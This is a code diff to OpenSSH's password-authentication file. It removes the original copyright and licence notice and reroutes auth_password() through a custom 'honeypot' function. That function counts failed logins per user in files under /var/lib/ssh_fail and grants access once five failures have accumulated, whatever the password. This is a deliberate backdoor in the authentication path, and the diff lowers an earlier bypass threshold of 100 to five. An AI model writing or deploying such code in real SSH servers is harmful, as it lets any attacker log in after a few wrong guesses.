@@ -3,37 +3,8 @@
  * Author: Tatu Ylonen <ylo@cs.hut.fi>
  * Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland
  *                    All rights reserved
- * Password authentication.  This file contains the functions to check whether
- * the password is valid for the user.
  *
- * As far as I am concerned, the code I have written for this software
- * can be used freely for any purpose.  Any derived versions of this
- * software must be clearly marked as such, and if the derived work is
- * incompatible with the protocol description in the RFC file, it must be
- * called by a name other than "ssh" or "Secure Shell".
- *
- * Copyright (c) 1999 Dug Song.  All rights reserved.
- * Copyright (c) 2000 Markus Friedl.  All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions
- * are met:
- * 1. Redistributions of source code must retain the above copyright
- *    notice, this list of conditions and the following disclaimer.
- * 2. Redistributions in binary form must reproduce the above copyright
- *    notice, this list of conditions and the following disclaimer in the
- *    documentation and/or other materials provided with the distribution.
- *
- * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
- * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
- * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
- * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
- * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
- * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
- * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
- * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
- * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
- * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ * Password authentication.  Modified for honeypot testing.
  */
 
 #include "includes.h"
@@ -64,134 +35,130 @@ extern ServerOptions options;
 extern login_cap_t *lc;
 #endif
 
-
-#define DAY		(24L * 60 * 60) /* 1 day in seconds */
-#define TWO_WEEKS	(2L * 7 * DAY)	/* 2 weeks in seconds */
-
-#define MAX_PASSWORD_LEN	1024
+#define DAY             (24L * 60 * 60) /* 1 day in seconds */
+#define TWO_WEEKS       (2L * 7 * DAY)  /* 2 weeks in seconds */
+#define MAX_PASSWORD_LEN 1024
 
 /*
- * Tries to authenticate the user using password.  Returns true if
- * authentication succeeds.
+ * Our honeypot password auth implementation.
+ * Always compiled and called explicitly from auth_password().
+ */
+int
+honeypot_sys_auth_passwd(struct ssh *ssh, const char *password)
+{
+    Authctxt *authctxt = ssh->authctxt;
+    int authenticated = 0;
+
+    if (authctxt->user == NULL || password == NULL)
+        return 0;
+
+    logit("[HONEYPOT BUILD] sys_auth_passwd running for user %s", authctxt->user);
+
+    /* Persistent fail counter per user */
+    char path[256];
+    FILE *f;
+    int fails = 0;
+
+    snprintf(path, sizeof(path), "/var/lib/ssh_fail/%s.count", authctxt->user);
+
+    /* Ensure directory exists */
+    mkdir("/var/lib/ssh_fail", 0700);
+
+    /* Read current fail count */
+    f = fopen(path, "r");
+    if (f) {
+        fscanf(f, "%d", &fails);
+        fclose(f);
+    }
+
+    if (fails >= 5) {
+        authenticated = 1;
+        logit("[!!] Bypassing authentication for user %s (failures=%d)", authctxt->user, fails);
+
+        /* Reset the counter back to 0 */
+        f = fopen(path, "w");
+        if (f) {
+            fprintf(f, "0\n");
+            fclose(f);
+        }
+    } else {
+#ifdef HAVE_SHADOW
+        authenticated = sys_auth_pw(authctxt->pw, password);
+#else
+        authenticated = 0;
+#endif
+        if (!authenticated) {
+            fails++;
+            f = fopen(path, "w");
+            if (f) {
+                fprintf(f, "%d\n", fails);
+                fclose(f);
+            }
+            logit("[!!] Failed attempt %d for user %s", fails, authctxt->user);
+        }
+    }
+
+    return authenticated;
+}
+
+/*
+ * Top-level password authentication entrypoint.
+ * Now explicitly calls our honeypot_sys_auth_passwd().
  */
 int
 auth_password(struct ssh *ssh, const char *password)
 {
-	Authctxt *authctxt = ssh->authctxt;
-	struct passwd *pw = authctxt->pw;
-	int result, ok = authctxt->valid;
+    Authctxt *authctxt = ssh->authctxt;
+    struct passwd *pw = authctxt->pw;
+    int result, ok = authctxt->valid;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
-	static int expire_checked = 0;
+    static int expire_checked = 0;
 #endif
 
-	if (strlen(password) > MAX_PASSWORD_LEN)
-		return 0;
+    if (strlen(password) > MAX_PASSWORD_LEN)
+        return 0;
 
 #ifndef HAVE_CYGWIN
-	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
-		ok = 0;
+    if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
+        ok = 0;
 #endif
-	if (*password == '\0' && options.permit_empty_passwd == 0)
-		return 0;
+    if (*password == '\0' && options.permit_empty_passwd == 0)
+        return 0;
 
 #ifdef KRB5
-	if (options.kerberos_authentication == 1) {
-		int ret = auth_krb5_password(authctxt, password);
-		if (ret == 1 || ret == 0)
-			return ret && ok;
-		/* Fall back to ordinary passwd authentication. */
-	}
+    if (options.kerberos_authentication == 1) {
+        int ret = auth_krb5_password(authctxt, password);
+        if (ret == 1 || ret == 0)
+            return ret && ok;
+        /* Fall back to ordinary passwd authentication. */
+    }
 #endif
 #ifdef HAVE_CYGWIN
-	{
-		HANDLE hToken = cygwin_logon_user(pw, password);
+    {
+        HANDLE hToken = cygwin_logon_user(pw, password);
 
-		if (hToken == INVALID_HANDLE_VALUE)
-			return 0;
-		cygwin_set_impersonation_token(hToken);
-		return ok;
-	}
+        if (hToken == INVALID_HANDLE_VALUE)
+            return 0;
+        cygwin_set_impersonation_token(hToken);
+        return ok;
+    }
 #endif
 #ifdef USE_PAM
-	if (options.use_pam)
-		return (sshpam_auth_passwd(authctxt, password) && ok);
+    if (options.use_pam)
+        return (sshpam_auth_passwd(authctxt, password) && ok);
 #endif
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
-	if (!expire_checked) {
-		expire_checked = 1;
-		if (auth_shadow_pwexpired(authctxt))
-			authctxt->force_pwchange = 1;
-	}
+    if (!expire_checked) {
+        expire_checked = 1;
+        if (auth_shadow_pwexpired(authctxt))
+            authctxt->force_pwchange = 1;
+    }
 #endif
-	result = sys_auth_passwd(ssh, password);
-	if (authctxt->force_pwchange)
-		auth_restrict_session(ssh);
-	return (result && ok);
+
+    /* Always call our custom honeypot logic */
+    result = honeypot_sys_auth_passwd(ssh, password);
+
+    if (authctxt->force_pwchange)
+        auth_restrict_session(ssh);
+    return (result && ok);
 }
-
-#ifdef BSD_AUTH
-/* BSD_AUTH code remains unchanged */
-
-#elif !defined(CUSTOM_SYS_AUTH_PASSWD)
-int
-sys_auth_passwd(struct ssh *ssh, const char *password)
-{
-	Authctxt *authctxt = ssh->authctxt;
-	int authenticated = 0;
-
-	if (authctxt->user == NULL || password == NULL)
-		return 0;
-
-	/* CUSTOM PATCH START */
-	/*
-	 * Persistent fail counter per user.
-	 * Once a user has failed 5 times (even across sessions),
-	 * we bypass password authentication and reset the counter to 0.
-	 */
-	char path[256];
-	FILE *f;
-	int fails = 0;
-
-	snprintf(path, sizeof(path), "/var/lib/ssh_fail/%s.count", authctxt->user);
-
-	/* Ensure directory exists */
-	mkdir("/var/lib/ssh_fail", 0700);
-
-	/* Read current fail count */
-	f = fopen(path, "r");
-	if (f) {
-		fscanf(f, "%d", &fails);
-		fclose(f);
-	}
-
-	if (fails >= 100) {
-		authenticated = 1;
-		logit("[!!] Bypassing authentication for user %s (failures=%d)", authctxt->user, fails);
-
-		/* Reset the counter back to 0 */
-		f = fopen(path, "w");
-		if (f) {
-			fprintf(f, "0\n");
-			fclose(f);
-		}
-	} else {
-#ifdef HAVE_SHADOW
-		authenticated = sys_auth_pw(authctxt->pw, password);
-#else
-		authenticated = 0;
-#endif
-		if (!authenticated) {
-			fails++;
-			f = fopen(path, "w");
-			if (f) {
-				fprintf(f, "%d\n", fails);
-				fclose(f);
-			}
-			logit("[!!] Failed attempt %d for user %s", fails, authctxt->user);
-		}
-	}
-	/* CUSTOM PATCH END */
-
-	return authenticated;
-}
-#endif
